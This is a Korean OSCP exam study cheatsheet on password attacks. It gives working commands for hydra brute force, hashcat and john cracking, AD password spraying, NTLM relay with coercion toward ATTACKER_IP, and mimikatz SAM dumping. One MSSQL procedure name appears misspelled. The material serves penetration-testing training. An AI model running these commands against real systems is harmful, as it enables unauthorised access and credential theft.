---
title: "패스워드 공격 (Password Attacks)"
date: 2026-06-20
weight: 50
draft: false
tags: ["oscp", "cheatsheet"]
summary: "해시 크랙, 온라인 브루트포스, AD 스프레이, 릴레이 — creds를 뚫는 모든 방법."
---

해시 크랙, 온라인 브루트포스, AD 스프레이, 릴레이 — 시험에서 creds를 뚫는 모든 방법.

- 출처: https://heretek.dev/oscp-cheatsheet/password-attacks/ (Jean Romero) — 재구성
- 변수: `$TARGET` = 공격 대상, `$KALI` = 공격자(Kali) IP

## 프로토콜별 워드리스트 찾기

```bash
locate seclists | grep -i ftp
locate seclists | grep -i ssh
```

## 기본 계정 브루트포스

```bash
# FTP
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://$TARGET -v -I

# SSH
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt ssh://$TARGET -v -I
```

## 특수문자가 든 패스워드 (: ! 등)

impacket 도구는 : 를 username:password 구분자로 쓴다. 패스워드에 : 가 있으면 impacket이 잘못 파싱해 엉뚱한 패스워드를 보낸다 — 계정 잠금으로 이어질 수 있다.

도구별 특수문자 처리 여부:

- evil-winrm — 처리 가능 (작은따옴표 사용): `evil-winrm -i TARGET -u user -p 'rabbit:)'`
- PowerShell remoting — 처리 가능: 도메인 내부에서 Invoke-Command 사용
- nxc — 처리 가능 (작은따옴표 사용): `nxc smb TARGET -u user -p 'rabbit:)'`
- impacket-psexec — 처리 불가, : 가 파싱을 깬다 → 특수문자 패스워드에는 절대 사용 금지
- impacket-secretsdump — 처리 불가, 같은 문제 → `-hashes` 플래그 사용
- impacket-wmiexec — 처리 불가, 같은 문제 → `-hashes` 플래그 사용

특수문자 패스워드의 안전한 대안:

```bash
# Option 1 — evil-winrm with single quotes (safest for special chars)
evil-winrm -i $ip -u user -p 'rabbit:)'

# Option 2 — Pass the hash (no password needed at all)
evil-winrm -i $ip -u user -H <ntlm_hash>

# Option 3 — PowerShell remoting from INSIDE the domain
$pass = ConvertTo-SecureString 'rabbit:)' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('DOMAIN\user', $pass)
Invoke-Command -ComputerName DC01 -Credential $cred -ScriptBlock { whoami }
```

계정을 실수로 잠갔을 때:

- 도메인 잠금은 보통 15-30분 뒤 자동 해제된다.
- 기다리는 동안 다른 머신 작업을 한다.
- 특수문자 패스워드를 여러 머신에 스프레이하지 않는다.

## DCC2 / 느린 해시 크랙 전략

크랙 우선순위:

- 테마 워드리스트 + 룰 — 유저명에 테마가 있을 때 (30초)
- 소형 common 리스트 — xato-net-10-million-passwords-1000.txt, 10k-most-common.txt
- 소형 common 리스트 + 룰 — 같은 리스트에 -r /usr/share/hashcat/rules/best64.rule
- rockyou — 최후 수단, 백그라운드로 돌리며 다른 작업을 한다

시험장에서 테마 워드리스트 만들기 (인터넷 불필요):

```bash
# Look at usernames — are they themed? (game chars, seasons, cities, etc.)
# Write 10-15 related words:
echo -e "Mushroom\nPrincess\nMario\nLuigi\nBowser\nToad\nPeach\nStar\nKoopa" > themed.txt

# Apply rules — turns 10 words into 700+ variations
hashcat -m 2100 hashes.txt themed.txt -r /usr/share/hashcat/rules/best64.rule --force
# This adds: !, 1, 123, s to S, UPPERCASE, reverse, etc.
```

알아볼 만한 테마:

- 계절 (summer, winter) → Season + 연도: Summer2024!
- 도시 이름 → City + 숫자: London123
- 랩에 나온 회사명 → CompanyName1!

- DCC2는 패스더해시에 쓸 수 없다. 반드시 크랙 먼저. hashcat 모드 2100 사용.

## 해시 식별

```bash
hashid -m '<HASH>'    # identifies hash type + hashcat mode
```

## 암기 필수 hashcat 모드 (시험 단골)

- 1000: NTLM — SAM 덤프, secretsdump, mimikatz
- 5600: NetNTLMv2 — Responder 캡처
- 13100: Kerberoast (RC4) — GetUserSPNs, Rubeus
- 18200: AS-REP Roast — GetNPUsers, Rubeus
- 1800: sha512crypt ($6$) — Linux /etc/shadow
- 500: md5crypt ($1$) — Linux /etc/shadow (구버전)
- 3200: bcrypt ($2a$) — 웹 애플리케이션
- 0: MD5 — 웹 앱 데이터베이스
- 1700: SHA-512 — 기타
- 400: WordPress ($P$) — wp_users 테이블
- 2100: DCC2 (캐시된 도메인 creds) — secretsdump 캐시 항목

## 표준 크랙 명령

```bash
hashcat -m <MODE> hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

# If rockyou doesn't crack it, try with more rules:
hashcat -m <MODE> hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/dive.rule --force

# View previously cracked results:
hashcat -m <MODE> hash.txt --show
john hash.txt --show
```

## 파일에서 해시 추출 (*2john 계열)

패스워드로 보호된 파일은 전부 크랙 가능한 해시로 변환한다. 누군가 보호해 뒀다면 내용물이 중요하다는 뜻 — 반드시 크랙한다.

- 중요: hashcat은 raw 파일(id_rsa, .zip, .pdf, .kdbx)을 읽지 못한다. 반드시 *2john으로 해시를 먼저 추출한다. raw 파일을 hashcat에 넣으면 "Separator unmatched" 에러가 난다. 파일 기반 해시는 john이 더 간단하다 — 추출 1번 + 크랙 1번. hashcat 대신 john 사용.

```bash
# Password cracking
pdf2john .pdf | tee pdf_hash
john --wordlist=/usr/share/wordlists/rockyou.txt pdf_hash

pdf2john file.pdf > hash.txt && john hash.txt --wordlist=rockyou.txt
ssh2john id_rsa > hash.txt && john hash.txt --wordlist=rockyou.txt
zip2john file.zip > hash.txt && john hash.txt --wordlist=rockyou.txt
keepass2john file.kdbx > hash.txt && john hash.txt --wordlist=rockyou.txt
rar2john file.rar > hash.txt && john hash.txt --wordlist=rockyou.txt
office2john file.docx > hash.txt && john hash.txt --wordlist=rockyou.txt
```

## 온라인 브루트포스

```bash
# SSH
hydra -l admin -P rockyou.txt ssh://TARGET -t 4
hydra -l admin -P rockyou.txt -s 2222 ssh://TARGET    # non-standard port

# FTP
hydra -l admin -P rockyou.txt ftp://TARGET -t 4

# RDP (password spray: one password, many users)
hydra -L users.txt -p 'CompanyPass2024!' rdp://TARGET

# SMB
hydra -l admin -P rockyou.txt smb://TARGET
```

### Hydra HTTP POST 폼 (웹 로그인 브루트포스)

가장 까다로운 케이스. Burp에서 로그인 요청을 먼저 캡처해 정확한 파라미터를 뽑아야 한다.

```bash
# Syntax: hydra TARGET http-post-form "PATH:BODY:FAIL_STRING"
# PATH = the form action URL
# BODY = POST parameters with ^USER^ and ^PASS^ placeholders
# FAIL_STRING = text that appears on FAILED login (tells hydra which attempts failed)

# Example: TinyFileManager login
hydra $TARGET http-post-form "/index.php:fm_usr=^USER^&fm_pwd=^PASS^:Login failed" -l admin -P rockyou.txt

# Example: WordPress wp-login.php
hydra TARGET http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:incorrect" -l admin -P rockyou.txt

# Example: generic form
hydra TARGET http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials" -l admin -P rockyou.txt
```

올바른 값을 찾는 법:

- Burp Suite에서 로그인 요청을 가로챈다.
- PATH = 폼이 POST하는 URL 경로 (POST /path 줄에서)
- BODY = username/password를 ^USER^/^PASS^로 바꾼 raw POST 본문
- FAIL_STRING = 실패 응답의 고유 텍스트 (Burp 응답에서 확인)

- 인증 공격으로 3분 넘게 붙잡고 있기 전에 명령을 다시 확인한다. 오래 걸린다면 문법이 틀렸을 가능성이 높다.

## 커스텀 워드리스트 생성

```bash
# Scrape website for words
cewl http://TARGET -w custom.txt -d 3

# Mutate wordlist with rules
hashcat --stdout wordlist.txt -r /usr/share/hashcat/rules/best64.rule > mutated.txt

# Combine
cat custom.txt rockyou.txt > combined.txt
```

### hashcat 커스텀 룰 (패스워드 정책 대응)

대상에 패스워드 정책이 있으면 (예: 대문자 + 숫자 + 특수문자) 워드리스트를 정책에 맞게 변형한다:

```bash
# Common rule functions (one per line in a .rule file)
# c = capitalize first letter, $1 = append "1", $! = append "!"
echo 'c$1$!' > custom.rule
# Applies: password → Password1!

# Two rules on separate lines = each applied independently (doubles output)
echo -e 'c$1$!\nc$2$@' > custom.rule
# Applies: password → Password1! AND Password2@

# Apply rules during cracking
hashcat -m <MODE> hash.txt wordlist.txt -r custom.rule

# Preview mutations without cracking (debug)
hashcat --stdout wordlist.txt -r custom.rule | head -20
```

기업 정책에 흔한 룰 조합:

- 대문자 + 숫자 + 특수문자: `c$1$!` → Password1!
- 대문자 + 연도: `c$2$0$2$4` → Password2024
- 대문자 + 계절 패턴: seasons.txt에 `c` 적용 → Spring, Winter
- 앞에 숫자 붙이기: `^1` → 1password

내장 룰: best64.rule (빠름, 준수한 커버리지), dive.rule (철저, 느림), rockyou-30000.rule (대규모)

## AD 패스워드 스프레이

잠금 정책을 항상 먼저 확인:

```bash
netexec smb <DC_IP> -u 'USER' -p 'PASS' --pass-pol
```

패스워드는 한 번에 하나씩, 관측 창구간을 두고 뿌린다:

```bash
netexec smb <DC_IP> -u users.txt -p 'CompanyName2024!' --continue-on-success --no-bruteforce
netexec smb <DC_IP> -u users.txt -p 'Password123!' --continue-on-success --no-bruteforce
kerbrute passwordspray -d DOMAIN --dc <DC_IP> users.txt 'Season+Year!'
```

흔한 스프레이 패스워드: Season+Year! (Spring2024!), CompanyName+Year!, Password123!, Welcome1!

## Net-NTLMv2 릴레이 (해시를 못 크랙할 때)

Net-NTLMv2 해시를 캡처했지만 크랙에 실패하면, 그 유저가 로컬 admin인 다른 머신으로 릴레이한다.

- 전제조건: 릴레이 대상에서 SMB signing이 비활성화되어 있어야 한다.

```bash
# Check SMB signing across the network
netexec smb <SUBNET>/24 --gen-relay-list targets.txt
# targets.txt = machines with SMB signing disabled

# Start relay (forward auth to a target, get shell)
impacket-ntlmrelayx -tf targets.txt -smb2support
# Default: dumps SAM hashes. Add -i for interactive shell, -c for command execution.
impacket-ntlmrelayx -tf targets.txt -smb2support -i   # interactive SMB shell on 127.0.0.1:11000
impacket-ntlmrelayx -tf targets.txt -smb2support -c 'whoami'
```

인증을 유발하는 방법:

- 웹 앱 UNC 경로 — 파일 경로 필드가 있는 플러그인/기능에 //ATTACKER_IP/fake 설정
- PetitPotam: `python3 PetitPotam.py ATTACKER_IP TARGET_IP`
- PrinterBug: `python3 dementor.py ATTACKER_IP TARGET_IP`
- xp_dirtytree (MSSQL): `EXEC master..xp_dirtytree '\\ATTACKER_IP\share'`

- 릴레이 ≠ PtH. 릴레이는 살아있는 인증 시도를 전달한다. PtH는 훔친 해시를 직접 사용한다.

## Non-SYSTEM admin 셸에서 mimikatz

admin이지만 SYSTEM이 아닐 때 (예: 로컬 admin으로 RDP), SAM 덤프 전에 token::elevate가 필요하다:

```cmd
mimikatz.exe
mimikatz # privilege::debug
mimikatz # token::elevate        :: impersonate SYSTEM token
mimikatz # lsadump::sam           :: now works — dumps local account hashes
```

- token::elevate 없이는 medium-integrity admin 셸에서 lsadump::sam이 access denied로 실패한다.
